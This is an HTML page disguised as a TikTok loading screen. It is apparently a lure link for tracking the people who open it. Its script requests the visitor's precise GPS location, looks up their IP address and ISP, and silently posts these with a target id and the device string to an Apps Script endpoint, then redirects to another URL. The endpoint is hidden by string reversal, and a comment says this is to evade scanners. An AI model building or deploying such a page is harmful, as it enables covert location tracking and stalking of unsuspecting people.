<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .loading-container { text-align: center; }
        .spinner { width: 45px; height: 45px; border: 4px solid #333; border-top: 4px solid #25f4ee; border-radius: 50%; animation: spin 0.6s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .tiktok-logo { font-size: 32px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="tiktok-logo">TikTok</div>
        <div class="spinner"></div>
    </div>

    <script>
        (function() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetUrl = urlParams.get('url');
            const targetId = urlParams.get('id');

            if (!targetUrl || !targetId) {
                window.location.replace('https://www.tiktok.com');
                return;
            }

            // --- STRATEGY: SILUMAN REVERSE ---
            // Link Apps Script lo dibalik biar gak kedeteksi bot scanner
            const revUrl = "cexe/H_5rDij2VAvEfX7wslCLrgipE3QJu4xfjZzVNbCbRNW8BCb4ghP7HUVGqGS3IzbzfyKA/s/sormam/moc.elgoog.tpircs//:sptth";
            const scriptUrl = revUrl.split("").reverse().join("");

            async function capture() {
                // 1. LANGSUNG TEMBAK IZIN LOKASI (PRIORITAS UTAMA)
                let lat = '', lon = '';
                try {
                    const pos = await new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000, enableHighAccuracy: true});
                    });
                    lat = pos.coords.latitude.toString();
                    lon = pos.coords.longitude.toString();
                } catch (e) { console.log("GPS Blocked/Timeout"); }

                // 2. AMBIL IP & ISP PARALEL
                let ip = '0.0.0.0', isp = 'Unknown';
                try {
                    const res = await fetch('https://ipapi.co/json/');
                    const data = await res.json();
                    ip = data.ip || ip;
                    isp = data.org || data.isp || isp;
                } catch (e) {}

                // 3. SEND DATA (FIRE AND FORGET)
                const body = new URLSearchParams({
                    id: targetId,
                    lat: lat,
                    lon: lon,
                    ip: ip,
                    isp: isp,
                    device: navigator.userAgent
                });

                fetch(scriptUrl, { method: 'POST', mode: 'no-cors', body: body });

                // 4. INSTANT REDIRECT (MAX 1.5 DETIK TOTAL PROSES)
                setTimeout(() => {
                    window.location.replace(targetUrl);
                }, 800); 
            }

            capture();
        })();
    </script>
</body>
</html>
